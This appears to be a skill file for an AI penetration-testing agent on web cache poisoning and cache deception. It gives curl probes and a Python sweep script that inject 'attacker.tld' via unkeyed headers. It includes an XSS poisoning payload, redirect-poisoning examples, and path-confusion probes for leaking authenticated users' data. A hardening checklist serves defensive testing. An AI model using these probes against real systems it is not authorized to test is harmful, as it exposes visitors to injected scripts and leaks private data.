---
name: Web Cache Poisoning
description: Reference for web cache poisoning and cache deception covering unkeyed-header probes, fat-GET attacks, parameter cloaking, path-confusion deception, and CDN/edge-specific quirks.
---

# Web Cache Poisoning / Deception

Reference for finding cache-layer bugs across CDN, reverse proxy, and application caches. Pull this in when the target sits behind Cloudflare / Akamai / Fastly / Cloudfront / Varnish or has any caching layer between client and origin.

> Black-box scope: every probe drives HTTP and reads cache-state headers (`X-Cache`, `Age`, `CF-Cache-Status`, etc.). Causality is established with paired requests: attacker-poisoned, then victim-shaped.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single probes with full headers | `execute_curl -i` | Always capture cache headers. |
| Cache-state diff over time | `kali_shell` + `execute_curl` | Send N requests in quick succession, watch `Age` and `X-Cache`. |
| Header-sweep automation | `execute_code` | Iterate through unkeyed-header candidates. |
| WebSocket cache probes (rare) | `execute_code` | `websockets` lib. |

## Cache-state header reference

| Header | Layer | Hit / Miss signal |
|---|---|---|
| `X-Cache: HIT/MISS` | Cloudfront, custom | Direct |
| `CF-Cache-Status: HIT/MISS/EXPIRED/BYPASS/REVALIDATED/UPDATING/STALE` | Cloudflare | Direct |
| `Age: <seconds>` | Generic | `>0` means cached; resets to 0 on origin fetch |
| `X-Drupal-Cache: HIT/MISS` | Drupal | Direct |
| `X-Cache-Hits: <n>` | Cloudfront / Varnish | Counter |
| `X-Served-By: cache-XXX-IAD` | Fastly | Reveals POP and cache identity |
| `X-Vercel-Cache: HIT/MISS/STALE/PRERENDER/REVALIDATED` | Vercel | Direct |
| `Akamai-Cache-Status: hit/miss/error` | Akamai | Direct |
| `Via: 1.1 varnish (Varnish/<v>)` | Varnish | Identifies layer |
| `X-Magento-Cache-Debug` | Magento (Varnish) | Direct |
| `x-nextjs-cache: HIT/MISS/STALE` | Next.js RSC | Direct |
| `Server-Timing: cdn-cache;desc=HIT` | Various | Direct |

Probe `Age` evolution: send the same request 3 times spaced 2s apart. If `Age` jumps from 0 to 2 to 4, you are reading a cached response.

## Cache-key reconnaissance

The cache key is the input the cache hashes to look up the response. Anything **outside the key** is "unkeyed" and can be poisoned.

Standard keyed components:

```
Method + scheme + host + path + (sometimes) sorted query params
```

Standard unkeyed components (poison candidates):

```
Custom headers (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, ...)
Cookie subset (depends on Vary)
Unsorted query params order
Headers listed in Vary may or may not be honored
```

Probe with the cache buster + unkeyed-header method:

```
execute_curl url: "https://target.tld/?cb=$(uuidgen)" headers: "X-Forwarded-Host: attacker.tld" -i
# Inspect response. If body reflects "attacker.tld" anywhere, the header reaches the origin.
# Then repeat WITHOUT X-Forwarded-Host on the SAME cb parameter:
execute_curl url: "https://target.tld/?cb=<same uuid>" -i
# If the cached response still contains "attacker.tld", the header is unkeyed -> poisoning is live.
```

## Unkeyed-header sweep

Common candidates:

```
X-Forwarded-Host:           X-Forwarded-Scheme:        X-Forwarded-Proto:
X-Forwarded-For:            X-Forwarded-Port:           X-Forwarded-Server:
X-Host:                     X-Original-URL:             X-Rewrite-URL:
X-Override-URL:             X-Original-Host:            X-Real-IP:
X-Custom-IP-Authorization:  Forwarded:                  X-Cluster-Client-IP:
X-Wap-Profile:              True-Client-IP:             X-ProxyUser-IP:
X-Forwarded-Path:           X-WP-Total:                 X-Backend-Server:
X-Request-ID:               X-Trace-Id:                 traceparent:
```

Param Miner / param-brute equivalents (manual via `execute_code`):

```
execute_code language: python
import requests, uuid
TARGET = "https://target.tld/"
HEADERS_CANDIDATES = ["X-Forwarded-Host","X-Original-URL","X-Forwarded-Scheme","X-Real-IP","X-Host"]
for h in HEADERS_CANDIDATES:
    cb = str(uuid.uuid4())
    poison = requests.get(TARGET, params={"cb":cb}, headers={h:"attacker.tld"})
    follow = requests.get(TARGET, params={"cb":cb})
    if "attacker.tld" in follow.text:
        print(f"POISONED via {h}")
```

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.query` / `redamon.search` to inventory cacheable or authenticated responses that lack `Vary`, and to pick a real captured path to poison.
- Paired causality with `redamon.replay`: first `redamon.replay id mutate:{query:"cb=ABC", headers:{"X-Forwarded-Host":"attacker.tld"}}`, then `redamon.replay id mutate:{query:"cb=ABC"}` without the header, reading `X-Cache` / `Age` / `CF-Cache-Status` on the second response. If the header-free replay still serves the poison on the same `cb`, the header is unkeyed and poisoning is live.
- Iterate the unkeyed-header candidate set the same way, one `redamon.replay` per header.
- `redamon.grep "attacker.tld"` confirms the reflection landed in the cached body; `redamon.diff id_poisoned id_clean` isolates exactly what changed.

## Attack matrix

### Classic XSS via unkeyed header

When `X-Forwarded-Host` is reflected into the response body (as an absolute URL, canonical link, or redirect):

```
1. Poison: GET /?cb=ID  with X-Forwarded-Host: "><script>alert(1)</script>
2. Cache stores the response containing the injected script
3. Victim visits /?cb=ID -> served the poisoned cached HTML
```

The poison must outlive any unique cache buster; pick a real path (`/`, `/products/listing`, `/static/main.css`) and cycle until it lands.

### Redirect poisoning

`X-Forwarded-Host` often controls the redirect target on `/login` -> `/dashboard`:

```
GET /login                with X-Forwarded-Host: attacker.tld
-> 302 Location: https://attacker.tld/dashboard
   (cached)
```

### Open-graph / canonical link

When the `<link rel="canonical">` or OG metadata is built from `X-Forwarded-Host`, social-network previews leak the attacker host with full SEO impact.

### Fat-GET (request smuggling adjacent)

A POST with a body sometimes reaches the origin via a GET cache-key. If origin treats the body as state-changing, the cache stores the response under the GET key:

```
POST /api/comment HTTP/1.1
...
{"text":"<script>...</script>"}
```

If the cache keys only on method+path (ignoring body), subsequent GETs to the same path can serve the poisoned response. Rare but devastating.

### Param cloaking / query-string normalization

```
GET /?utm_source=evil   <- cached
GET /?utm_source=evil&  <- different normalization
GET /?utm_source=evil#  <- fragment may strip
GET /?utm_source=EVIL   <- case sensitivity
```

If the cache normalizes one way and origin another, you can mismatch keys to either bypass or poison.

### Cache deception (Omer Gil 2017)

The classic. Origin treats `/` and `/anything.css` as the same dynamic page; cache treats `/anything.css` as a static asset (cacheable, no auth required).

```
1. Victim authenticates, visits /profile.css
2. Origin renders /profile (the dynamic page) with victim's session cookie
3. Cache stores the response under /profile.css (because of the static-extension rule)
4. Attacker fetches /profile.css with no auth -> served the victim's profile (PII leak)
```

Probes:

```
execute_curl url: "https://target.tld/api/me/style.css"     # known dynamic /api/me appended with /style.css
execute_curl url: "https://target.tld/api/me;.css"
execute_curl url: "https://target.tld/api/me%2f.css"
execute_curl url: "https://target.tld/api/me/.css"
execute_curl url: "https://target.tld/api/me%00.css"        # NUL injection
```

If the response contains the dynamic content but the cache treats it as static (HIT on second fetch from a different IP / no-auth context), deception is live.

### Path-confusion variants

Different proxies normalize paths differently:

```
/api/me/../x.css          # path traversal at proxy, stripped at origin
/api/me/%2E%2E/x.css      # encoded
/api/me;.css              # semicolon truncation (Java EE servlets)
/api/me//x.css            # double slash
```

### Cookie-cache key gaps

Authenticated responses cached without the user's session cookie in the key:

```
1. User A visits /api/profile (returns A's data)
2. Cache stores under /api/profile (no Vary: Cookie or Vary: Authorization)
3. User B visits /api/profile -> served A's data
```

Probe:

```
execute_curl url: "https://target.tld/api/profile" headers: "Cookie: session=ALICE"
execute_curl url: "https://target.tld/api/profile" -i           # no cookie, watch for X-Cache: HIT and Alice's data
```

### CDN-specific quirks

| CDN | Quirk |
|---|---|
| Cloudflare | `X-Forwarded-Host` rarely makes it to origin (CF strips). `Host` header rewrite via Workers is the more common gap. |
| Akamai | `X-Akamai-Edge-IP`, `Akamai-Origin-Hop`, complex `Vary` behavior. |
| Cloudfront | `Cache-Control: public` + missing query-string-based key is common. |
| Fastly | VCL-based; `X-Served-By` exposes POP. Surrogate-Key header for purge. |
| Varnish | Default no-key on `Authorization`; many setups cache authed pages. |
| Vercel / Next.js | `x-nextjs-cache` + on-demand revalidation secret in URL; see `/skill nextjs`. |

### Cache key stripping

Some CDNs strip headers from the key based on built-in rules. Test which headers reach the origin via:

```
execute_curl url: "https://target.tld/" headers: "X-Test-Origin: $(uuidgen)" -v
# Inspect headers; if the response contains an echo of X-Test-Origin (some apps do), the header reaches origin.
# Then send WITHOUT X-Test-Origin and watch X-Cache: HIT on the cb parameter.
```

## Cache-layer hardening checklist

Documented for completeness in reports:

- Include `Authorization`, session `Cookie`, and tenant headers in the cache key (or `Vary` + a per-key plan).
- Strip / canonicalize unkeyed headers before forwarding to origin OR include them in the cache key.
- Distinguish dynamic vs static at the cache (do not treat `/profile.css` as static when origin returns dynamic HTML).
- Reject path normalizations that the origin doesn't honor (`;`, `//`, `..` segments) at the edge.
- Set `Cache-Control: private, no-store` on auth-required responses; do not depend on `Vary: Cookie` alone.

## Validation shape

A clean cache-poisoning finding includes:

1. The exact poisoning request (method + path + headers + body).
2. The follow-up probe request **without** the poison header.
3. Both responses with full headers (especially `X-Cache` / `Age` / `CF-Cache-Status`).
4. Proof the poison persists for `> Age` seconds (a third probe from a different IP/network if possible).
5. For deception: User A's authenticated response served to anonymous User B + the cache header confirming HIT.

## False positives

- The "poison" header is reflected but only in dynamic responses (not cached).
- `Cache-Control: private` set correctly; cache layer respects it.
- `Vary: Authorization, Cookie` properly honored (test by sending different cookies, verify cache key changes).
- The reflected value is HTML-encoded server-side before being stored.
- Edge / CDN strips the header before reaching origin (test by echoing the header back via a controlled endpoint).

## Hand-off

```
Cache poisoning -> XSS                 -> built-in xss skill
Cache deception leaks PII              -> /skill information_disclosure
Host-header poisoning -> reset link    -> /skill open_redirect (host header section), password-reset chain
Cache + Request smuggling chain        -> dedicated request smuggling community skill (Tier 4 #32)
```

## Pro tips

- The single biggest tell is `Age:` going from 0 to N over multiple requests. If `Age` always stays at 0, the path is not cached.
- Cache busters (`?cb=$(uuidgen)`) isolate test runs; reusing the same buster between attacker and victim probes is the cleanest causality proof.
- Some caches normalize trailing slashes; `/profile` and `/profile/` may share or split keys.
- Always test a real production-like path (the home page, a popular static asset). Cache rules differ between routes.
- Cache lifetime is the attack window. A `max-age=86400` poisoning lasts a day; a `max-age=10` requires re-poisoning often.
- For Cloudflare specifically, `Cache-Control: public, max-age=...` on dynamic responses is the easiest tell of a misconfigured rule.
